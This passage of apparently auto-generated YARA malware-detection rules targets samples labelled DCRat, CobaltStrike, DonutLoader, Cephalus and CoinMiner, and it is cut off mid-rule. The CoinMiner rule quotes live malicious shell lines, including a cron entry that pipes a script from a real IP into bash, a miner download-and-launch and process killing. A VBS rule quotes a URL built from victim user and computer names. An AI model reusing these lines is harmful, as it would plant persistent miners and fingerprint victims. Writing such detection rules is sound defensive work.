      $s6 = "C:\\Program Files\\Go" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.(*sigctxt).rax" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.(*sigctxt).rbx" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*sigctxt).rdx" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.munmap.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.(*sigctxt).rsp" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.sigprofNonGoWrapper" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*sigctxt).rbp" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.(*sigctxt).rsi" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.sigprofNonGo" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_Cephalus_signature__d42595b695_58 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash4 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
   strings:
      $s1 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s2 = "internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s4 = "os/executable_windows.go" fullword ascii /* score: '12.00'*/
      $s5 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s6 = "os/exec_windows.go" fullword ascii /* score: '12.00'*/
      $s7 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s8 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s9 = "os/executable.go" fullword ascii /* score: '12.00'*/
      $s10 = "runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s11 = "runtime/error.go" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_e689afee5f_59 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash3 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s3 = "=*struct { F uintptr; X0 *exec.Cmd; X1 chan<- exec.ctxResult }" fullword ascii /* score: '24.00'*/
      $s4 = "os/exec.Command.func1" fullword ascii /* score: '24.00'*/
      $s5 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s6 = "0*struct { F uintptr; X0 *os.File; X1 *exec.Cmd }" fullword ascii /* score: '20.00'*/
      $s7 = "*func(*exec.Cmd)" fullword ascii /* score: '20.00'*/
      $s8 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s9 = "os/exec.(*Cmd).writerDescriptor" fullword ascii /* score: '20.00'*/
      $s10 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s11 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s12 = "os/exec.closeDescriptors" fullword ascii /* score: '18.00'*/
      $s13 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
      $s14 = "os/exec.(*Cmd).watchCtx" fullword ascii /* score: '17.00'*/
      $s15 = "os/exec.(*Cmd).argv" fullword ascii /* score: '17.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_imphash__DCRat_60 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash).exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash).exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_3c9a5d90.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_7e30454b.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_ab944f7c.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_b5d0c22e.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_b9168974.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_dac7e634.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_f8292702.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_fdfc8477.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_fe3aca08.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26fbcc5e8567054c4de9a8514704645e69ffe5eaf91b595d047c90150175c0fa"
      hash2 = "616e24c3e3317ffeeb713f6ef71f469bf4f1e401d44e6594da281c8734bd6baf"
      hash3 = "3c9a5d90d37ba18c0ff3a4e6461cabdf1de6a3eee8890a39e68a1549c433c7e0"
      hash4 = "7e30454bb3e83a895f105099a3d38ad4ca539804bd437052219cb4fe1de153a8"
      hash5 = "ab944f7cb219427b232b32926ac1e7689dcf9eefb6253235bad5c7d541b53ef9"
      hash6 = "b5d0c22e99b421b09938ff885a0a794d3da9f1c2b2b41aa57ad970d230a6c6c7"
      hash7 = "b9168974aee96f657950455bf1933cf18500ae8b1da94a90860fcdafc91b95b4"
      hash8 = "dac7e634f21237813b6404768ea1915ce233f2fdc68a5a29f8b286045379543a"
      hash9 = "f82927022143272ed87aedb2db32ed88bb81956d65f5f701e76d94b8cdc936dd"
      hash10 = "fdfc8477c2be5da54b9db404821c51bc15aa8337073daebaaa0e9b4b360c33b2"
      hash11 = "fe3aca08dfca8765efe0f3e7cf36a6a234e13d8c7451d3e0cb2a040b8d34f9df"
   strings:
      $s1 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s2 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" fullword ascii /* score: '19.00'*/
      $s3 = "&Enter password for the encrypted file:" fullword wide /* score: '17.00'*/
      $s4 = "Unknown encryption method in %s$The specified password is incorrect." fullword wide /* score: '16.00'*/
      $s5 = "<pi-ms-win-core-processthreads-l1-1-2" fullword wide /* score: '15.00'*/
      $s6 = "Extracting files to %s folder$Extracting files to temporary folder" fullword wide /* score: '14.00'*/
      $s7 = "Cannot create hard link %s(You need to unpack the link target first" fullword wide /* score: '13.00'*/
      $s8 = "%The archive comment header is corrupt" fullword wide /* score: '12.00'*/
      $s9 = "ErroraErrors encountered while performing the operation" fullword wide /* score: '12.00'*/
      $s10 = "Incorrect password for %s" fullword wide /* score: '12.00'*/
      $s11 = "Checksum error in %s Packed data checksum error in %s" fullword wide /* score: '10.00'*/
      $s12 = "Please download a fresh copy and retry the installation" fullword wide /* score: '10.00'*/
      $s13 = "Security warningKPlease remove %s from folder %s. It is unsecure to run %s until it is done." fullword wide /* score: '10.00'*/
      $s14 = "Corrupt header is found" fullword wide /* score: '9.00'*/
      $s15 = "Main archive header is corrupt" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_DonutLoader_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__61 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash2 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
   strings:
      $s1 = "llocated into an arenaruntime.Pinner: decreased non-existing pin counterrecursive call during initialization - linker skewattemp" ascii /* score: '18.00'*/
      $s2 = "/total:secondsbcryptprimitives.dll not foundpanic called with nil argumentcheckdead: inconsistent countsrunqputslow: queue is no" ascii /* score: '15.00'*/
      $s3 = "net.getprotobyname" fullword ascii /* score: '12.00'*/
      $s4 = "runtime: unable to acquire - semaphore out of syncmallocgc called with gcphase == _GCmarkterminationruntime.Pinner: object was a" ascii /* score: '11.00'*/
      $s5 = "G*struct { F uintptr; X0 func() ([]net.IPAddr, error); X1 chan net.ret }" fullword ascii /* score: '10.00'*/
      $s6 = "net.acquireThread.func1" fullword ascii /* score: '10.00'*/
      $s7 = "net.lookupProtocol.func1" fullword ascii /* score: '10.00'*/
      $s8 = "net.acquireThread" fullword ascii /* score: '10.00'*/
      $s9 = "net.winError" fullword ascii /* score: '10.00'*/
      $s10 = "myhostnaL9" fullword ascii /* score: '10.00'*/
      $s11 = "net.releaseThread" fullword ascii /* score: '10.00'*/
      $s12 = "net.adapterAddresses" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.SetFinalizer: first argument was allocated into an arenacompileCallback: expected function with one uintptr-sized result" ascii /* score: '9.00'*/
      $s14 = "internal/syscall/windows.GetComputerNameEx" fullword ascii /* score: '8.00'*/
      $s15 = "syscall.GetAddrInfoW" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _CobaltStrike_signature__f0ea7b7844bbc5bfa9bb32efdcea957c_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_e689af_62 {
   meta:
      description = "_subset_batch - from files CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash3 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash4 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "C:/Program Files/Go/src/runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s2 = "C:/Program Files/Go/src/internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s3 = "C:/Program Files/Go/src/sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s4 = "C:/Program Files/Go/src/runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s5 = "C:/Program Files/Go/src/runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s6 = "C:/Program Files/Go/src/runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s7 = "C:/Program Files/Go/src/os/exec.go" fullword ascii /* score: '12.00'*/
      $s8 = "C:/Program Files/Go/src/runtime/stkframe.go" fullword ascii /* score: '10.00'*/
      $s9 = "C:/Program Files/Go/src/runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s10 = "C:/Program Files/Go/src/runtime/error.go" fullword ascii /* score: '10.00'*/
      $s11 = "C:/Program Files/Go/src/internal/testlog/log.go" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_DonutLoade_63 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash3 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash4 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "runtime.mutexWaitListHead" fullword ascii /* score: '26.00'*/
      $s2 = "runtime.mutexPreferLowLatency" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.getfp" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.pinnerGetPtr" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.inlineFrame.valid" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.fpTracebackPCs" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.(*pinState).set" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.setPinned" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.init.6.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.init.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.fpTracebackPartialExpand" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.debugPinnerV1" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.tracefpunwindoff" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.(*Pinner).Pin.func1" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.setPinned.func1" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_CobaltStrike_signature__f0ea7b_64 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
   strings:
      $s1 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s2 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s3 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s4 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s5 = "roc1: new g is not Gdeadnewproc1: newg missing stackos: process already finishedprotocol driver not attachedregion exceeds uintp" ascii /* score: '18.00'*/
      $s6 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s7 = "SystemFuH" fullword ascii /* base64 encoded string*/ /* score: '17.00'*/
      $s8 = "ntdll.dlH" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getLoadLibrary" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.getLoadLibraryEx" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.getGetProcAddress" fullword ascii /* score: '14.00'*/
      $s12 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '13.00'*/
      $s13 = "runtime.handlecompletion" fullword ascii /* score: '13.00'*/
      $s14 = "runtime: text offset base pointer out of rangeruntime: type offset base pointer out of rangesignal arrived during external code " ascii /* score: '12.00'*/
      $s15 = "compileCallback: float arguments not supportedmemory reservation exceeds address space limitpanicwrap: unexpected string after t" ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d3acd0876034f12090388b8a5def080f00ac91c46c17f75a0735a658f7d56016_d3acd087_ee25db571ec10ee8ce1c68fd13d239369e2f12418a4c1dcf2_65 {
   meta:
      description = "_subset_batch - from files d3acd0876034f12090388b8a5def080f00ac91c46c17f75a0735a658f7d56016_d3acd087.js, ee25db571ec10ee8ce1c68fd13d239369e2f12418a4c1dcf2c6e0dec598404bb_ee25db57.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3acd0876034f12090388b8a5def080f00ac91c46c17f75a0735a658f7d56016"
      hash2 = "ee25db571ec10ee8ce1c68fd13d239369e2f12418a4c1dcf2c6e0dec598404bb"
   strings:
      $s1 = "43, 64, 45, 63, 53, 52, 52, 53, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, 61, 62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 60, 62, 26, " ascii /* score: '9.00'*/ /* hex encoded string 'CdEcSRRSb&dCdEcSRSab&dCdEcSRR`b&' */
      $s2 = "53, 54, 62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 52, 62, 26, 64, 43, 64, 45, 63, 61, 60, 59, 62, 26, 64, 43, 64, 45, 63, 53, 52, " ascii /* score: '9.00'*/ /* hex encoded string 'STb&dCdEcSRRRb&dCdEca`Yb&dCdEcSR' */
      $s3 = "43, 64, 45, 63, 53, 52, 52, 59, 62, 26, 64, 43, 64, 45, 63, 61, 57, 58, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, 58, 62, 26, 64, " ascii /* score: '9.00'*/ /* hex encoded string 'CdEcSRRYb&dCdEcaWXb&dCdEcSRSXb&d' */
      $s4 = "53, 52, 62, 26, 64, 43, 64, 45, 63, 61, 57, 58, 62, 26, 64, 43, 64, 45, 63, 61, 57, 54, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, " ascii /* score: '9.00'*/ /* hex encoded string 'SRb&dCdEcaWXb&dCdEcaWTb&dCdEcSRS' */
      $s5 = "63, 53, 52, 53, 60, 62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 59, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, 58, 62, 26, 64, 43, 64, " ascii /* score: '9.00'*/ /* hex encoded string 'cSRS`b&dCdEcSRRYb&dCdEcSRSXb&dCd' */
      $s6 = "64, 45, 63, 53, 52, 52, 53, 62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 58, 62, 26, 64, 43, 64, 45, 63, 61, 57, 57, 62, 26, 64, 43, " ascii /* score: '9.00'*/ /* hex encoded string 'dEcSRRSb&dCdEcSRRXb&dCdEcaWWb&dC' */
      $s7 = "64, 45, 63, 53, 52, 52, 60, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, 55, 62, 26, 64, 43, 64, 45, 63, 53, 52, 54, 53, 62, 26, 64, " ascii /* score: '9.00'*/ /* hex encoded string 'dEcSRR`b&dCdEcSRSUb&dCdEcSRTSb&d' */
      $s8 = "63, 53, 52, 52, 59, 62, 26, 64, 43, 64, 45, 63, 61, 59, 56, 62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 59, 62, 26, 64, 43, 64, 45, " ascii /* score: '9.00'*/ /* hex encoded string 'cSRRYb&dCdEcaYVb&dCdEcSRRYb&dCdE' */
      $s9 = "64, 45, 63, 53, 52, 52, 52, 62, 26, 64, 43, 64, 45, 63, 61, 56, 57, 62, 26, 64, 43, 64, 45, 63, 53, 52, 54, 53, 62, 26, 64, 43, " ascii /* score: '9.00'*/ /* hex encoded string 'dEcSRRRb&dCdEcaVWb&dCdEcSRTSb&dC' */
      $s10 = "43, 64, 45, 63, 53, 52, 52, 52, 62, 26, 64, 43, 64, 45, 63, 61, 57, 58, 62, 26, 64, 43, 64, 45, 63, 61, 57, 57, 62, 26, 64, 43, " ascii /* score: '9.00'*/ /* hex encoded string 'CdEcSRRRb&dCdEcaWXb&dCdEcaWWb&dC' */
      $s11 = "52, 57, 62, 26, 64, 43, 64, 45, 63, 61, 60, 61, 62, 26, 64, 43, 64, 45, 63, 61, 58, 58, 62, 26, 64, 43, 64, 45, 63, 61, 56, 61, " ascii /* score: '9.00'*/ /* hex encoded string 'RWb&dCdEca`ab&dCdEcaXXb&dCdEcaVa' */
      $s12 = "61, 56, 61, 62, 26, 64, 43, 64, 45, 63, 61, 56, 60, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, 58, 62, 26, 64, 43, 64, 45, 63, 53, " ascii /* score: '9.00'*/ /* hex encoded string 'aVab&dCdEcaV`b&dCdEcSRSXb&dCdEcS' */
      $s13 = "53, 52, 53, 59, 62, 26, 64, 43, 64, 45, 63, 53, 52, 54, 54, 62, 26, 64, 43, 64, 45, 63, 61, 57, 58, 62, 26, 64, 43, 64, 45, 63, " ascii /* score: '9.00'*/ /* hex encoded string 'SRSYb&dCdEcSRTTb&dCdEcaWXb&dCdEc' */
      $s14 = "64, 43, 64, 45, 63, 53, 52, 52, 58, 62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 59, 62, 26, 64, 43, 64, 45, 63, 53, 52, 53, 58, 62, " ascii /* score: '9.00'*/ /* hex encoded string 'dCdEcSRRXb&dCdEcSRRYb&dCdEcSRSXb' */
      $s15 = "62, 26, 64, 43, 64, 45, 63, 53, 52, 52, 53, 62, 26, 64, 43, 64, 45, 63, 61, 58, 57, 62, 26, 64, 43, 64, 45, 63, 61, 58, 60, 62, " ascii /* score: '9.00'*/ /* hex encoded string 'b&dCdEcSRRSb&dCdEcaXWb&dCdEcaX`b' */
   condition:
      ( uint16(0) == 0x2f2f and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _c990338f8145dc29c6f38fb73cf05c77_imphash__3ba9d2ec_CoinMiner_signature__c990338f8145dc29c6f38fb73cf05c77_imphash__DiskWrite_66 {
   meta:
      description = "_subset_batch - from files c990338f8145dc29c6f38fb73cf05c77(imphash)_3ba9d2ec.exe, CoinMiner(signature)_c990338f8145dc29c6f38fb73cf05c77(imphash).exe, DiskWriter(signature)_351592d5ead6df0859b0cc0056827c95(imphash).exe, DiskWriter(signature)_351592d5ead6df0859b0cc0056827c95(imphash)_3e05d05b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ba9d2ecc5764276c2d8d4cae3ba2eeaade6b2225105aea2172b308c59b224b6"
      hash2 = "4ff9f470c13a5061dfc526fe951629cd790430713938a7f7ae582f478982d2df"
      hash3 = "f41a9a7212a4869ec3584536e24fc1db7ad94ada6f1da55bb08e07a1f9aa39da"
      hash4 = "3e05d05b027d98f43fbe2d1ba30b8d67edf10db3775574a672bbafc02c3031f5"
   strings:
      $s1 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s2 = "subprocess)" fullword ascii /* score: '15.00'*/
      $s3 = "importlib.readers)" fullword ascii /* score: '13.00'*/
      $s4 = "importlib.resources.readers)" fullword ascii /* score: '13.00'*/
      $s5 = "importlib.resources._common)" fullword ascii /* score: '13.00'*/
      $s6 = "importlib.abc)" fullword ascii /* score: '13.00'*/
      $s7 = "importlib.resources.abc)" fullword ascii /* score: '13.00'*/
      $s8 = "email.contentmanager)" fullword ascii /* score: '12.00'*/
      $s9 = "email.headerregistry)" fullword ascii /* score: '12.00'*/
      $s10 = "email.header)" fullword ascii /* score: '12.00'*/
      $s11 = "tempfile)" fullword ascii /* score: '11.00'*/
      $s12 = "zPYZ.pyz" fullword ascii /* score: '10.00'*/
      $s13 = "importlib.metadata._text)" fullword ascii /* score: '10.00'*/
      $s14 = "email.errors)" fullword ascii /* score: '10.00'*/
      $s15 = "importlib.metadata)" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 31000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__CoinMiner_signature__571841fb_CoinMiner_signature__5fb604a0_CoinMiner_signature__6984add6_CoinMiner_si_67 {
   meta:
      description = "_subset_batch - from files CoinMiner(signature).sh, CoinMiner(signature)_571841fb.sh, CoinMiner(signature)_5fb604a0.sh, CoinMiner(signature)_6984add6.sh, CoinMiner(signature)_9a0ce1fd.sh, CoinMiner(signature)_e3b35476.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "788949bced00005c922e666d700a832cef7e30536a711761ae68ff82a7605d6a"
      hash2 = "571841fb078412dc07a0ad7bde0f7455c8d9291ee7b530b93fa5ff2d372492f0"
      hash3 = "5fb604a045443810d279a6955c2e4792a27d93dcce35908620030196fc4e9a79"
      hash4 = "6984add6a21fecc140603d7e8a5f6ce0956123892a2f4b4196306a7f9f22d364"
      hash5 = "9a0ce1fdf45370b23e6e1727a40b5143835a2ca34e05c67b4754eb31c869df52"
      hash6 = "e3b35476ea7d4de4b689a952ab25ed5ad1063149a03c0f342cfba9ad26bd614a"
   strings:
      $x1 = "    if download_fallback && launch_program \"$fallback_executable\" -o hosts-to-ignore.ignorelist.com:9443 --tls ; then" fullword ascii /* score: '39.00'*/
      $s2 = "  # --- Step 2: Kill other 'bash' processes, excluding the current shell ---" fullword ascii /* score: '28.00'*/
      $s3 = "external_ip=$(wget -qO- ipv4.icanhazip.com 2>/dev/null || curl -s ipv4.icanhazip.com 2>/dev/null)" fullword ascii /* score: '27.00'*/
      $s4 = "        (crontab -l 2>/dev/null; echo \"*/30 * * * * wget -O - http://162.248.53.119:8000/mon.sh | bash\") | crontab -" fullword ascii /* score: '24.00'*/
      $s5 = "    if ! crontab -l 2>/dev/null | grep -q \"wget -O - http://162.248.53.119:8000/mon.sh | bash\"; then" fullword ascii /* score: '24.00'*/
      $s6 = "        echo \"Warning: All startup attempts failed - continuing script anyway\"" fullword ascii /* score: '23.00'*/
      $s7 = "  # --- Step 1: Kill 'xmr' and 'node' processes ---" fullword ascii /* score: '23.00'*/
      $s8 = "        wget -O \"$fallback_executable\" \"$download_url\" || return 1" fullword ascii /* score: '22.00'*/
      $s9 = "        curl -fL -o \"$fallback_executable\" \"$download_url\" || return 1" fullword ascii /* score: '21.00'*/
      $s10 = "  elif command -v pgrep >/dev/null 2>&1; then" fullword ascii /* score: '20.00'*/
      $s11 = "  if command -v pgrep >/dev/null 2>&1; then" fullword ascii /* score: '20.00'*/
      $s12 = "  if command -v pkill >/dev/null 2>&1; then" fullword ascii /* score: '20.00'*/
      $s13 = "# Function to kill high CPU processes" fullword ascii /* score: '19.00'*/
      $s14 = "        elif command -v yum &>/dev/null; then" fullword ascii /* score: '15.00'*/
      $s15 = "        if command -v apt-get &>/dev/null; then" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x2123 and filesize < 20KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b8c51aeb99dbe837e8ee834949bb5746941fd0fe2b913dbfc8022e4e3c6bb715_b8c51aeb_d225a8a95dfc7e8f6a29871553a2975e094459d55b2920f4d_68 {
   meta:
      description = "_subset_batch - from files b8c51aeb99dbe837e8ee834949bb5746941fd0fe2b913dbfc8022e4e3c6bb715_b8c51aeb.vbs, d225a8a95dfc7e8f6a29871553a2975e094459d55b2920f4ddced5a6a38d15a0_d225a8a9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b8c51aeb99dbe837e8ee834949bb5746941fd0fe2b913dbfc8022e4e3c6bb715"
      hash2 = "d225a8a95dfc7e8f6a29871553a2975e094459d55b2920f4ddced5a6a38d15a0"
   strings:
      $s1 = "\"url_array(1) = \"\"http://199.103.56.165/ORD-ALL/\"\" & userName & separ & computerName & \"\"/ORD-2020.txt\"\" \"" fullword ascii /* score: '25.00'*/
